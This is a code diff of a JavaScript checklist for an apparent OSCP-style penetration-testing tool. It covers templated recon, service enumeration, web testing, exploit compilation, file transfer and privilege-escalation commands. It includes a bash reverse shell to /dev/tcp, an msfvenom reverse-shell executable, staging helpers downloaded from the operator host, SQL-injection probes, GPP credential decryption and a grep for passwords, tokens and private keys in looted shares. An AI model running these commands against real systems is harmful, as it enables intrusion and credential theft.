@@ -1,17 +1,40 @@
+import { normalizeChecklist } from "../lib/commandContract.js";
+
 export const DEFAULT_VARIABLES = {
   workspaceRoot: "/home/kali/oscp",
   lhost: "10.10.14.2",
   lport: "443",
   rhost: "",
+  targetSlug: "",
+  tcpPorts: "",
+  udpPorts: "",
+  selectedServiceHost: "",
+  selectedServicePort: "",
+  webScheme: "http",
+  webPort: "80",
+  vhost: "",
+  baseUrl: "",
+  webPath: "index.php",
+  webParameter: "id",
+  webValue: "FN_PROBE",
+  sessionCookie: "",
+  uploadFile: "",
+  uploadField: "file",
+  uploadedRemotePath: "",
   rport: "",
   uport: "",
   targetName: "",
   userFlagName: "local.txt",
   rootFlagName: "proof.txt",
   domain: "",
+  realm: "",
   baseDn: "",
   dc: "",
+  dcIp: "",
+  dnsServer: "",
   user: "",
+  selectedCredentialId: "",
+  credentialType: "",
   memberUser: "",
   targetGroup: "",
   aclTarget: "",
@@ -22,26 +45,44 @@ export const DEFAULT_VARIABLES = {
   bloodhoundTarget: "",
   password: "",
   gppCpassword: "",
+  gppXmlFile: "",
   hash: "",
   smbShare: "SYSVOL",
   smbDirectory: ".",
+  nfsExport: "",
+  exploitQuery: "",
+  exploitId: "",
+  exploitFile: "",
+  compiledExploit: "",
+  transferFile: "",
+  hashesFile: "",
+  hashMode: "",
   sprayPassword: "",
   sprayJitter: "3-5",
   sprayRockyouLimit: "25",
   subnet: "172.16.10.0/24",
+  pivotHost: "",
+  pivotUser: "",
+  pivotInterface: "ligolo",
+  proxyPort: "1080",
+  internalHost: "",
+  internalSubnet: "172.16.10.0/24",
+  callbackHost: "",
   interface: "tun0",
   wordlist: "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
 };
 
 export const VARIABLE_GROUPS = [
   { label: "Workspace", keys: ["workspaceRoot"] },
-  { label: "Operator", keys: ["lhost", "lport", "interface"] },
-  { label: "Target", keys: ["targetName", "rhost", "rport", "uport", "subnet", "userFlagName", "rootFlagName"] },
-  { label: "Identity", keys: ["domain", "baseDn", "dc", "user", "memberUser", "targetGroup", "aclTarget", "aclPrincipal", "aclRights", "dcsyncUser", "bloodhoundSource", "bloodhoundTarget", "password", "gppCpassword", "hash"] },
-  { label: "Resources", keys: ["smbShare", "smbDirectory", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
+  { label: "Operator", keys: ["lhost", "lport", "interface", "callbackHost"] },
+  { label: "Target", keys: ["targetName", "targetSlug", "rhost", "tcpPorts", "udpPorts", "selectedServiceHost", "selectedServicePort", "userFlagName", "rootFlagName"] },
+  { label: "Web", keys: ["webScheme", "webPort", "vhost", "baseUrl", "webPath", "webParameter", "webValue", "sessionCookie", "uploadFile", "uploadField", "uploadedRemotePath"] },
+  { label: "Identity", keys: ["domain", "realm", "baseDn", "dc", "dcIp", "dnsServer", "user", "credentialType", "memberUser", "targetGroup", "aclTarget", "aclPrincipal", "aclRights", "dcsyncUser", "bloodhoundSource", "bloodhoundTarget", "password", "gppCpassword", "hash"] },
+  { label: "Pivot", keys: ["pivotHost", "pivotUser", "pivotInterface", "proxyPort", "subnet", "internalHost", "internalSubnet"] },
+  { label: "Resources", keys: ["smbShare", "smbDirectory", "nfsExport", "gppXmlFile", "exploitQuery", "exploitId", "exploitFile", "compiledExploit", "transferFile", "hashesFile", "hashMode", "sprayPassword", "sprayJitter", "sprayRockyouLimit", "wordlist"] },
 ];
 
-export const CHECKLIST = [
+const CHECKLIST_SOURCE = [
   {
     id: "setup",
     number: "00",
@@ -53,8 +94,8 @@ export const CHECKLIST = [
         title: "Create a target workspace",
         detail: "Keep raw scans and evidence separate from working files.",
         commands: [
-          { label: "Create folders", value: "mkdir -p {{workspaceRoot}}/{{targetName}}/{scans,web,loot,exploits,notes} && cd {{workspaceRoot}}/{{targetName}}" },
-          { label: "Start command log", value: "script -a {{workspaceRoot}}/{{targetName}}/notes/terminal.log" },
+          { label: "Create folders", value: "mkdir -p '{{workspaceRoot}}/{{targetSlug}}'/{scans,web,loot,exploits,notes} && cd '{{workspaceRoot}}/{{targetSlug}}'" },
+          { label: "Start command log", value: "script -a '{{workspaceRoot}}/{{targetSlug}}/notes/terminal.log'" },
         ],
       },
       {
@@ -95,33 +136,33 @@ export const CHECKLIST = [
         id: "recon-tcp-all",
         title: "Scan all TCP ports",
         commands: [
-          { label: "Full TCP", value: "sudo nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -oA {{workspaceRoot}}/{{targetName}}/scans/tcp-all {{rhost}}" },
-          { label: "Extract ports", value: "grep -oP '\\d+/open' {{workspaceRoot}}/{{targetName}}/scans/tcp-all.gnmap | cut -d/ -f1 | paste -sd, -" },
+          { label: "Full TCP", value: "sudo nmap -Pn -n -p- --min-rate 2000 --max-retries 2 -oA '{{workspaceRoot}}/{{targetSlug}}/scans/tcp-all' {{rhost}}" },
+          { label: "Extract ports", value: "grep -oP '\\d+/open' '{{workspaceRoot}}/{{targetSlug}}/scans/tcp-all.gnmap' | cut -d/ -f1 | paste -sd, -" },
         ],
       },
       {
         id: "recon-tcp-detail",
         title: "Fingerprint open TCP services",
         commands: [
-          { label: "Focused scan", value: "sudo nmap -Pn -n -sCV -p {{rport}} -oA {{workspaceRoot}}/{{targetName}}/scans/tcp-detail {{rhost}}" },
-          { label: "Vulnerability hints", value: "nmap -Pn -n --script vuln -p {{rport}} -oN {{workspaceRoot}}/{{targetName}}/scans/tcp-vuln.txt {{rhost}}" },
+          { label: "Focused scan", value: "sudo nmap -Pn -n -sCV -p {{tcpPorts}} -oA {{workspaceRoot}}/{{targetSlug}}/scans/tcp-detail {{rhost}}" },
+          { label: "Vulnerability hints", value: "nmap -Pn -n --script vuln -p {{tcpPorts}} -oN {{workspaceRoot}}/{{targetSlug}}/scans/tcp-vuln.txt {{rhost}}" },
         ],
       },
       {
         id: "recon-udp",
         title: "Check common UDP services",
         commands: [
-          { label: "Top UDP", value: "sudo nmap -Pn -n -sU --top-ports 100 --open -oA {{workspaceRoot}}/{{targetName}}/scans/udp-top100 {{rhost}}" },
-          { label: "Focused UDP", value: "sudo nmap -Pn -n -sU -sV -p {{uport}} -oN {{workspaceRoot}}/{{targetName}}/scans/udp-detail.txt {{rhost}}" },
+          { label: "Top UDP", value: "sudo nmap -Pn -n -sU --top-ports 100 --open -oA '{{workspaceRoot}}/{{targetSlug}}/scans/udp-top100' {{rhost}}" },
+          { label: "Focused UDP", value: "sudo nmap -Pn -n -sU -sV -p {{udpPorts}} -oN {{workspaceRoot}}/{{targetSlug}}/scans/udp-detail.txt {{rhost}}" },
         ],
       },
       {
         id: "recon-hostnames",
         title: "Resolve hostnames and virtual hosts",
         commands: [
-          { label: "Certificate names", value: "for port in $(echo '{{rport}}' | tr ',' ' '); do cert=$(echo | timeout 3 openssl s_client -connect {{rhost}}:$port -servername {{rhost}} 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null); if [ -n \"$cert\" ]; then printf '\\n[+] Port %s:\\n%s\\n' \"$port\" \"$cert\"; fi; done | tee {{workspaceRoot}}/{{targetName}}/scans/certificates.txt" },
-          { label: "SSL cert scan", value: "nmap -Pn -n -p {{rport}} --script ssl-cert -oN {{workspaceRoot}}/{{targetName}}/scans/ssl-certs.txt {{rhost}}" },
-          { label: "Hosts entry", value: "echo '{{rhost}} {{targetName}} {{dc}} {{domain}}' | sudo tee -a /etc/hosts" },
+          { label: "Certificate names", value: "for port in $(echo '{{tcpPorts}}' | tr ',' ' '); do cert=$(echo | timeout 3 openssl s_client -connect {{rhost}}:$port -servername {{rhost}} 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName 2>/dev/null); if [ -n \"$cert\" ]; then printf '\\n[+] Port %s:\\n%s\\n' \"$port\" \"$cert\"; fi; done | tee {{workspaceRoot}}/{{targetSlug}}/scans/certificates.txt" },
+          { label: "SSL cert scan", value: "nmap -Pn -n -p {{tcpPorts}} --script ssl-cert -oN {{workspaceRoot}}/{{targetSlug}}/scans/ssl-certs.txt {{rhost}}" },
+          { label: "Hosts entry", value: "echo '{{rhost}} {{vhost}} {{dc}} {{domain}}' | sudo tee -a /etc/hosts" },
         ],
       },
     ],
@@ -135,11 +176,11 @@ export const CHECKLIST = [
       {
         id: "svc-smb",
         title: "SMB / RPC (139, 445)",
-        detail: "The guest command, the current command-context credential, and every account saved under Findings with a secret are added automatically below as all-shares commands. Each identity downloads into its own folder. Run credentials deliberately: repeated bad passwords can lock accounts.",
+        detail: "Guest access is always available as a deliberate check. Authenticated commands appear only for the one credential explicitly selected for this machine. Downloads stay in an identity-specific folder; repeated bad passwords can lock accounts.",
         commands: [
           { label: "Anonymous SMB", value: "nxc smb {{rhost}} -u '' -p '' --shares --users --groups" },
           { label: "Authenticated SMB", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares --users --groups --sessions" },
-          { label: "Triage all downloaded SMB loot", value: "find {{workspaceRoot}}/{{targetName}}/loot/smb -type f -printf '%s %p\\n' | sort -nr > {{workspaceRoot}}/{{targetName}}/loot/smb-file-index.txt; grep -RniI -E 'pass(word)?|passwd|pwd|secret|token|api.?key|connection.?string|cpassword|user(name)?|BEGIN (RSA |OPENSSH )?PRIVATE KEY' {{workspaceRoot}}/{{targetName}}/loot/smb | tee {{workspaceRoot}}/{{targetName}}/loot/smb-credential-hits.txt" },
+          { label: "Triage all downloaded SMB loot", value: "find '{{workspaceRoot}}/{{targetSlug}}/loot/smb' -type f -printf '%s %p\\n' | sort -nr > '{{workspaceRoot}}/{{targetSlug}}/loot/smb-file-index.txt'; grep -RniI -E 'pass(word)?|passwd|pwd|secret|token|api.?key|connection.?string|cpassword|user(name)?|BEGIN (RSA |OPENSSH )?PRIVATE KEY' '{{workspaceRoot}}/{{targetSlug}}/loot/smb' | tee '{{workspaceRoot}}/{{targetSlug}}/loot/smb-credential-hits.txt'" },
         ],
       },
       {
@@ -147,9 +188,9 @@ export const CHECKLIST = [
         title: "Group Policy Preferences (GPP) credentials",
         detail: "A cpassword from an XML file is encrypted data, not the login password. Preserve the XML and its userName/runAs field, decrypt the cpassword, then replace the normal user/password variables with the recovered credential before retesting SMB.",
         commands: [
-          { label: "Find downloaded GPP XML", value: "grep -Rni --include='*.xml' -E 'cpassword|userName|runAs' {{workspaceRoot}}/{{targetName}}/loot/smb" },
+          { label: "Find downloaded GPP XML", value: "grep -Rni --include='*.xml' -E 'cpassword|userName|runAs' '{{workspaceRoot}}/{{targetSlug}}/loot/smb'" },
           { label: "Decrypt one cpassword", value: "gpp-decrypt '{{gppCpassword}}'" },
-          { label: "Parse a saved XML file", value: "impacket-Get-GPPPassword LOCAL -xmlfile /path/to/Groups.xml" },
+          { label: "Parse a saved XML file", value: "impacket-Get-GPPPassword LOCAL -xmlfile '{{gppXmlFile}}'" },
           { label: "Search SYSVOL with valid credentials", value: "impacket-Get-GPPPassword '{{domain}}/{{user}}:{{password}}@{{rhost}}' -dc-ip {{rhost}}" },
           { label: "Retest recovered credential", value: "nxc smb {{rhost}} -d '{{domain}}' -u '{{user}}' -p '{{password}}' --shares --users --groups" },
         ],
@@ -166,8 +207,10 @@ export const CHECKLIST = [
         id: "svc-nfs",
         title: "NFS / RPC (111, 2049)",
         commands: [
-          { label: "Exports", value: "showmount -e {{rhost}} && nmap -Pn -p 111,2049 --script 'nfs-*' {{rhost}}" },
-          { label: "Mount", value: "sudo mkdir -p /mnt/{{targetName}} && sudo mount -t nfs {{rhost}}:/EXPORT /mnt/{{targetName}} -o nolock" },
+          { label: "List exports", value: "showmount -e {{rhost}}" },
+          { label: "Enumerate NFS RPC methods", value: "nmap -Pn -p 111,2049 --script 'nfs-*' {{rhost}}" },
+          { label: "Prepare local mount point", stateChange: "local-system", cleanup: { required: true, command: "sudo rmdir '/mnt/{{targetSlug}}'", note: "Remove the empty mount point only after unmounting the export." }, verificationCommand: "test -d '/mnt/{{targetSlug}}'", value: "sudo mkdir -p '/mnt/{{targetSlug}}'" },
+          { label: "Mount selected export read-only", stateChange: "local-system", cleanup: { required: true, command: "sudo umount '/mnt/{{targetSlug}}'", note: "Unmount the assessment export before removing the mount point." }, verificationCommand: "findmnt '/mnt/{{targetSlug}}'", value: "sudo mount -t nfs '{{rhost}}:{{nfsExport}}' '/mnt/{{targetSlug}}' -o ro,nolock" },
         ],
       },
       {
@@ -175,7 +218,7 @@ export const CHECKLIST = [
         title: "SNMP (161/udp)",
         commands: [
           { label: "Find community", value: "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{rhost}}" },
-          { label: "Walk", value: "snmpwalk -v2c -c public {{rhost}} .1 | tee {{workspaceRoot}}/{{targetName}}/scans/snmpwalk.txt" },
+          { label: "Walk", value: "snmpwalk -v2c -c public {{rhost}} .1 | tee '{{workspaceRoot}}/{{targetSlug}}/scans/snmpwalk.txt'" },
         ],
       },
       {
@@ -194,6 +237,28 @@ export const CHECKLIST = [
           { label: "SMTP users", value: "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{rhost}}" },
         ],
       },
+      {
+        id: "svc-rdp",
+        title: "RDP (3389)",
+        detail: "Enumerate the endpoint first. The client card appears with the explicitly selected credential; connect only after confirming RDP is exposed and the account is permitted to log on.",
+        commands: [
+          { label: "RDP encryption and identity", value: "nmap -Pn -n -p 3389 --script rdp-enum-encryption,rdp-ntlm-info {{rhost}}" },
+          { label: "Open RDP with the selected credential", value: "xfreerdp3 /v:{{rhost}} /u:'{{user}}' /p:'{{password}}' /cert:ignore +clipboard" },
+        ],
+      },
+      {
+        id: "svc-databases",
+        title: "Common databases and application services",
+        detail: "Fingerprint the exact service before choosing one matching client. Use a single selected endpoint and credential; these cards do not sweep hosts or chain protocols.",
+        commands: [
+          { label: "Fingerprint common database ports", value: "nmap -Pn -n -sV -p 1433,1521,3306,5432,6379,27017 {{rhost}}" },
+          { label: "MSSQL with selected domain credential", value: "impacket-mssqlclient '{{domain}}/{{user}}:{{password}}@{{rhost}}' -windows-auth" },
+          { label: "MySQL prompt for selected credential", requiresSelectedCredential: true, value: "mysql --host {{rhost}} --port {{selectedServicePort}} --user '{{user}}' --password" },
+          { label: "PostgreSQL prompt for selected credential", requiresSelectedCredential: true, value: "psql 'host={{rhost}} port={{selectedServicePort}} user={{user}} sslmode=prefer'" },
+          { label: "Redis unauthenticated ping", value: "redis-cli -h {{rhost}} -p {{selectedServicePort}} PING" },
+          { label: "MongoDB unauthenticated ping", value: "mongosh --host {{rhost}} --port {{selectedServicePort}} --quiet --eval 'db.runCommand({ ping: 1 })'" },
+        ],
+      },
     ],
   },
   {
@@ -206,25 +271,25 @@ export const CHECKLIST = [
         id: "web-baseline",
         title: "Capture headers, technology, and source",
         commands: [
-          { label: "Headers", value: "curl -k -i http://{{rhost}}:{{rport}}/ | tee {{workspaceRoot}}/{{targetName}}/web/root-response.txt" },
-          { label: "Fingerprint", value: "whatweb -a 3 http://{{rhost}}:{{rport}}/" },
-          { label: "Common files", value: "for p in robots.txt sitemap.xml .git/HEAD .env; do echo ===$p; curl -ks http://{{rhost}}:{{rport}}/$p; done" },
+          { label: "Headers", value: "curl -k -i '{{webScheme}}://{{rhost}}:{{webPort}}/' | tee '{{workspaceRoot}}/{{targetSlug}}/web/root-response.txt'" },
+          { label: "Fingerprint", value: "whatweb -a 3 '{{webScheme}}://{{rhost}}:{{webPort}}/'" },
+          { label: "Common files", value: "for p in robots.txt sitemap.xml .git/HEAD .env; do echo ===$p; curl -ks \"{{webScheme}}://{{rhost}}:{{webPort}}/$p\"; done" },
         ],
       },
       {
         id: "web-content",
         title: "Discover content and files",
         commands: [
-          { label: "Directories", value: "ffuf -u http://{{rhost}}:{{rport}}/FUZZ -w {{wordlist}} -e .php,.aspx,.txt,.bak,.zip -ac -c -o {{workspaceRoot}}/{{targetName}}/web/ffuf-content.json" },
-          { label: "Parameters", value: "ffuf -u 'http://{{rhost}}:{{rport}}/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c" },
+          { label: "Directories", value: "ffuf -u '{{webScheme}}://{{rhost}}:{{webPort}}/FUZZ' -w '{{wordlist}}' -e .php,.aspx,.txt,.bak,.zip -ac -c -o '{{workspaceRoot}}/{{targetSlug}}/web/ffuf-content.json'" },
+          { label: "Parameters", value: "ffuf -u '{{webScheme}}://{{rhost}}:{{webPort}}/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c" },
         ],
       },
       {
         id: "web-vhosts",
         title: "Discover virtual hosts",
         commands: [
-          { label: "Vhosts", value: "ffuf -u http://{{rhost}}:{{rport}}/ -H 'Host: FUZZ.{{domain}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
-          { label: "DNS names", value: "ffuf -u http://FUZZ.{{domain}}:{{rport}}/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
+          { label: "Vhosts", value: "ffuf -u '{{webScheme}}://{{rhost}}:{{webPort}}/' -H 'Host: FUZZ.{{domain}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
+          { label: "DNS names", value: "ffuf -u '{{webScheme}}://FUZZ.{{domain}}:{{webPort}}/' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac -c" },
         ],
       },
       {
@@ -232,8 +297,40 @@ export const CHECKLIST = [
         title: "Test inputs and access controls manually",
         detail: "Proxy interesting requests, change one input at a time, and record the exact request that proves impact. Avoid automatic exploitation tools during the exam; verify the current OffSec restrictions before starting.",
         commands: [
-          { label: "Replay request", value: "curl -k -i -X POST 'http://{{rhost}}:{{rport}}/login' -d 'username={{user}}&password={{password}}'" },
-          { label: "Manual SQLi comparison", value: "for value in \"1\" \"1' AND '1'='1\" \"1' AND '1'='2\"; do echo \"=== id=$value\"; curl -ksS -o /tmp/fieldnotes-response -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode \"id=$value\" 'http://{{rhost}}:{{rport}}/index.php'; sha256sum /tmp/fieldnotes-response; done" },
+          { label: "Replay request", value: "curl -k -i -X POST '{{webScheme}}://{{rhost}}:{{webPort}}/login' --data-urlencode 'username={{user}}' --data-urlencode 'password={{password}}'" },
+          { label: "Manual SQLi baseline request", stateChange: "local-evidence", value: "curl -ksS -o '{{workspaceRoot}}/{{targetSlug}}/web/sqli-baseline.response' -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode '{{webParameter}}=1' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+          { label: "Manual SQLi true-condition request", stateChange: "local-evidence", value: "curl -ksS -o '{{workspaceRoot}}/{{targetSlug}}/web/sqli-true.response' -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode \"{{webParameter}}=1' AND '1'='1\" '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+          { label: "Manual SQLi false-condition request", stateChange: "local-evidence", value: "curl -ksS -o '{{workspaceRoot}}/{{targetSlug}}/web/sqli-false.response' -w 'status=%{http_code} bytes=%{size_download} time=%{time_total}\\n' --get --data-urlencode \"{{webParameter}}=1' AND '1'='2\" '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+          { label: "Compare saved SQLi responses", value: "sha256sum '{{workspaceRoot}}/{{targetSlug}}/web/sqli-baseline.response' '{{workspaceRoot}}/{{targetSlug}}/web/sqli-true.response' '{{workspaceRoot}}/{{targetSlug}}/web/sqli-false.response'" },
+        ],
+      },
+      {
+        id: "web-input-classes",
+        title: "Validate traversal, inclusion, and command injection",
+        detail: "Use the observed path and parameter, change one value at a time, and compare against a saved baseline. The operator supplies one bounded candidate; the app does not generate payloads or infer code execution.",
+        commands: [
+          { label: "Replay one traversal / inclusion candidate", value: "curl -k -i --path-as-is --get --data-urlencode '{{webParameter}}={{webValue}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+          { label: "Replay one command-injection candidate", value: "curl -k -i --get --data-urlencode '{{webParameter}}={{webValue}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+        ],
+      },
+      {
+        id: "web-access-xss",
+        title: "Compare access control and reflection",
+        detail: "Replay the same resource without and with one operator-supplied session cookie. For XSS, use a unique harmless marker first and inspect the returned encoding/context before choosing any browser-side proof.",
+        commands: [
+          { label: "Anonymous resource request", value: "curl -k -i '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+          { label: "Authenticated resource request", value: "curl -k -i -H 'Cookie: {{sessionCookie}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+          { label: "Reflection-context probe", value: "curl -k -i --get --data-urlencode '{{webParameter}}={{webValue}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+        ],
+      },
+      {
+        id: "web-upload",
+        title: "Validate one file-upload path",
+        detail: "Use a minimal benign file first. Record its local checksum, the exact multipart field, server response, returned path, retrieval behavior, and the application-specific deletion step. Do not leave an uploaded artifact behind.",
+        commands: [
+          { label: "Hash upload source", runsOn: "lhost", value: "sha256sum '{{uploadFile}}'" },
+          { label: "Upload one reviewed file", runsOn: "lhost", stateChange: "target-file", cleanup: { required: true, command: "", note: "Delete the exact returned remote object through the application's supported delete path and verify it is no longer retrievable." }, verificationCommand: "curl -k -I '{{baseUrl}}/{{uploadedRemotePath}}'", value: "curl -k -i -F '{{uploadField}}=@{{uploadFile}}' '{{webScheme}}://{{rhost}}:{{webPort}}/{{webPath}}'" },
+          { label: "Verify returned upload path", runsOn: "lhost", value: "curl -k -I '{{baseUrl}}/{{uploadedRemotePath}}'" },
         ],
       },
       {
@@ -241,9 +338,9 @@ export const CHECKLIST = [
         title: "Check file handling, backups, and API surface",
         detail: "Use observed routes and parameters. These commands identify capabilities; they do not prove an arbitrary file read, upload bypass, or authorization flaw by themselves.",
         commands: [
-          { label: "Allowed methods", value: "curl -k -i -X OPTIONS 'http://{{rhost}}:{{rport}}/'" },
-          { label: "Common backup suffixes", value: "for path in index.php web.config appsettings.json package.json; do for suffix in .bak .old .zip '~'; do url=\"http://{{rhost}}:{{rport}}/$path$suffix\"; curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"$url\"; done; done" },
-          { label: "API description files", value: "for path in swagger.json openapi.json api/docs swagger/index.html; do curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"http://{{rhost}}:{{rport}}/$path\"; done" },
+          { label: "Allowed methods", value: "curl -k -i -X OPTIONS '{{webScheme}}://{{rhost}}:{{webPort}}/'" },
+          { label: "Common backup suffixes", value: "for path in index.php web.config appsettings.json package.json; do for suffix in .bak .old .zip '~'; do url=\"{{webScheme}}://{{rhost}}:{{webPort}}/$path$suffix\"; curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"$url\"; done; done" },
+          { label: "API description files", value: "for path in swagger.json openapi.json api/docs swagger/index.html; do curl -ksS -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\\n' \"{{webScheme}}://{{rhost}}:{{webPort}}/$path\"; done" },
         ],
       },
     ],
@@ -258,16 +355,30 @@ export const CHECKLIST = [
         id: "access-research",
         title: "Research the exact service version",
         commands: [
-          { label: "Searchsploit", value: "searchsploit --exclude='(PoC)|dos' '{{targetName}} {{rport}}'" },
-          { label: "Copy exploit", value: "searchsploit -m EXPLOIT_ID && sed -n '1,220p' EXPLOIT_FILE" },
+          { label: "Searchsploit", value: "searchsploit --exclude='(PoC)|dos' '{{exploitQuery}}'" },
+          { label: "Copy one reviewed exploit locally", stateChange: "local-evidence", value: "searchsploit -m '{{exploitId}}'" },
+          { label: "Inspect copied source", value: "sed -n '1,240p' '{{exploitFile}}'" },
+        ],
+      },
+      {
+        id: "access-adapt-exploit",
+        title: "Adapt a public exploit before any target use",
+        detail: "Read the source and references, confirm architecture and dependencies, identify every target-specific parameter, and compile locally. These cards do not execute the exploit or choose a payload.",
+        commands: [
+          { label: "Record source type and checksum", value: "file '{{exploitFile}}'; sha256sum '{{exploitFile}}'" },
+          { label: "Review target-specific parameters", value: "grep -nE 'RHOST|RPORT|LHOST|LPORT|TARGET|URL|HOST|PORT|offset|arch|payload' '{{exploitFile}}'" },
+          { label: "Check local compiler architecture", value: "gcc -dumpmachine; uname -m" },
+          { label: "Compile-check C source without output", value: "gcc -Wall -Wextra -fsyntax-only '{{exploitFile}}'" },
+          { label: "Compile reviewed C source locally", stateChange: "local-evidence", verificationCommand: "file '{{compiledExploit}}'; sha256sum '{{compiledExploit}}'", cleanup: { required: false, command: "", note: "Retain the reviewed binary with its source and checksum as machine-scoped working evidence, or remove that exact path after the assessment." }, value: "gcc -Wall -Wextra -O2 '{{exploitFile}}' -o '{{compiledExploit}}'" },
+          { label: "Inspect compiled architecture and dependencies", value: "file '{{compiledExploit}}'; readelf -h '{{compiledExploit}}'; ldd '{{compiledExploit}}'" },
         ],
       },
       {
         id: "access-remote",
         title: "Try remote access with discovered credentials",
-        detail: "Commands are generated from the active credential and every saved account. A valid SMB login is not automatically a shell: Evil-WinRM requires WinRM and permission to use it, while NetExec SMB execution and WMI require administrator access. Look for Pwn3d in NetExec output. If authentication works but every shell method fails, continue with AD enumeration and Kerberoasting.",
+        detail: "Commands are generated only from the one credential explicitly selected for this machine. A valid SMB login is not automatically a shell: Evil-WinRM requires WinRM and permission to use it, while NetExec SMB execution and WMI require administrator access. Look for Pwn3d in NetExec output. If authentication works but every shell method fails, record that result before choosing another check.",
         commands: [
-          { label: "Check remote-management ports", value: "nmap -Pn -n -sV --open -p 22,445,3389,5985,5986 -oN {{workspaceRoot}}/{{targetName}}/scans/remote-access.txt {{rhost}}" },
+          { label: "Check remote-management ports", value: "nmap -Pn -n -sV --open -p 22,445,3389,5985,5986 -oN '{{workspaceRoot}}/{{targetSlug}}/scans/remote-access.txt' {{rhost}}" },
         ],
       },
       {
@@ -283,16 +394,23 @@ export const CHECKLIST = [
         title: "Prepare simple reverse-shell payloads",
         commands: [
           { label: "Bash", value: "bash -c 'bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1'" },
-          { label: "PowerShell", value: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o {{workspaceRoot}}/{{targetName}}/exploits/shell.exe" },
+          { label: "PowerShell", value: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o '{{workspaceRoot}}/{{targetSlug}}/exploits/shell.exe'" },
         ],
       },
       {
         id: "access-transfer",
         title: "Transfer files from Kali",
+        detail: "Use target-side staging only when the check inherently needs a local helper. Prefer packaged Kali resources, transfer the smallest file, compare source and destination SHA-256 values, save the relevant output, then remove the transferred file.",
         commands: [
-          { label: "Serve current folder", value: "python3 -m http.server 8000 --bind {{lhost}}" },
-          { label: "Linux download", value: "curl http://{{lhost}}:8000/FILE -o /tmp/FILE && chmod +x /tmp/FILE" },
-          { label: "Windows download", value: "powershell -c \"iwr http://{{lhost}}:8000/FILE -OutFile C:\\Windows\\Temp\\FILE\"" },
+          { label: "Serve current folder", runsOn: "lhost", value: "python3 -m http.server 8000 --bind {{lhost}}" },
+          { label: "Hash source on Kali", runsOn: "lhost", value: "sha256sum '{{transferFile}}'" },
+          { label: "Stage on Linux", runsOn: "foothold-linux", value: "curl 'http://{{lhost}}:8000/{{transferFile}}' -o '/tmp/{{transferFile}}'" },
+          { label: "Verify Linux checksum", runsOn: "foothold-linux", value: "sha256sum '/tmp/{{transferFile}}'" },
+          { label: "Mark Linux helper executable", runsOn: "foothold-linux", stateChange: "target-file", value: "chmod 700 '/tmp/{{transferFile}}'" },
+          { label: "Remove Linux helper", runsOn: "foothold-linux", stateChange: "target-file", cleanup: { required: false, command: "", note: "This command is the cleanup action." }, verificationCommand: "test ! -e '/tmp/{{transferFile}}'", value: "rm -f '/tmp/{{transferFile}}'" },
+          { label: "Stage on Windows", runsOn: "foothold-windows", value: "powershell -c \"iwr 'http://{{lhost}}:8000/{{transferFile}}' -OutFile 'C:\\Windows\\Temp\\{{transferFile}}'\"" },
+          { label: "Verify Windows checksum", runsOn: "foothold-windows", value: "certutil -hashfile \"C:\\Windows\\Temp\\{{transferFile}}\" SHA256" },
+          { label: "Remove Windows helper", runsOn: "foothold-windows", stateChange: "target-file", cleanup: { required: false, command: "", note: "This command is the cleanup action." }, verificationCommand: "powershell -c \"if (Test-Path 'C:\\Windows\\Temp\\{{transferFile}}') { exit 1 }\"", value: "powershell -c \"Remove-Item -Force 'C:\\Windows\\Temp\\{{transferFile}}'\"" },
         ],
       },
       {
@@ -354,6 +472,15 @@ export const CHECKLIST = [
           { label: "Backups and application roots", value: "find /var/backups /opt /srv /usr/local -maxdepth 3 -type f -printf '%M %u:%g %p\\n' 2>/dev/null | head -250" },
         ],
       },
+      {
+        id: "linux-kernel-last-resort",
+        title: "Consider kernel exposure last",
+        detail: "Use kernel exploitation only after higher-signal permission, credential, job, group, mount, container, and service checks. Confirm the exact build, architecture, mitigations, and exploit source before any attempt.",
+        commands: [
+          { label: "Capture exact kernel and architecture", runsOn: "foothold-linux", value: "uname -a; cat /proc/version; getconf LONG_BIT; cat /proc/sys/kernel/randomize_va_space 2>/dev/null" },
+          { label: "Search packaged exploit references", runsOn: "lhost", value: "searchsploit --exclude='(PoC)|dos' '{{exploitQuery}}'" },
+        ],
+      },
     ],
   },
   {
@@ -376,6 +503,7 @@ export const CHECKLIST = [
         commands: [
           { label: "Services", value: "powershell -c \"Get-CimInstance Win32_Service | Select Name,State,StartName,PathName | Format-Table -Auto\"" },
